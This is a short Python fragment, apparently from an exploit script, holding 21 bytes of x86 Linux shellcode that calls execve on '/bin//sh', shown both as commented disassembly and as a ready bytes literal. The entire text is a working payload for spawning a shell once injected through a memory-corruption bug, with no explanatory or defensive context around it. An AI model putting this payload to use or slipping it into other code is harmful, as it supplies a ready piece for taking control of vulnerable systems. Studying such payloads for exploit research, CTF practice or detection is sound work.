#  0:   31 c9                   xor    ecx, ecx
#  2:   f7 e1                   mul    ecx 
#  4:   51                      push   rcx 
#  5:   68 2f 2f 73 68          push   0x68732f2f
#  a:   68 2f 62 69 6e          push   0x6e69622f
#  f:   89 e3                   mov    ebx, esp
# 11:   b0 0b                   mov    al, 0xb
# 13:   cd 80                   int    0x80
shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
